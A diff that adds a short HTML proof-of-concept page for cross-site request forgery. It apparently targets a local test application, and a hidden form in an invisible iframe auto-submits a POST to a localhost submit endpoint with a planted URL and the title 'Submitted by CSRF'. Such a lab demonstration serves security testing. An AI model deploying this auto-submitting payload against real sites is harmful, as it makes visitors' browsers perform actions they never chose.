@@ -1,0 +1,11 @@
+<html>
+    <body>
+        <iframe style="display:none" name="frame"></iframe>
+        <form name="csrf" action="http://localhost:8000/submit" method="POST"
+            target="frame">
+            <input type="hidden" name="url" value="http://www.kamibarut.de">
+            <input type="hidden" name="title" value="Submitted by CSRF">
+        </form>
+        <script type="text/javascript">document.csrf.submit();</script>
+    </body>
+</html>
